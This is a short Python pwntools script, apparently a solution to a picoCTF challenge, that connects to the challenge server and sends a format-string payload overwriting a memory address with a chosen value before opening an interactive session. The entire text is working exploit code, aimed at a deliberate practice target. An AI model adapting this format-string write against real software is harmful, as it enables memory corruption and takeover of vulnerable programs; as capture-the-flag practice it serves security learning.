from pwn import *

context.binary = './vuln'
p = remote('rhea.picoctf.net', 50147)

target = int('404060', 16)
value = int('67616c66', 16)
offset = 14

payload = fmtstr_payload(offset,{target:value},write_size='byte')

p.sendline(payload)

p.interactive()
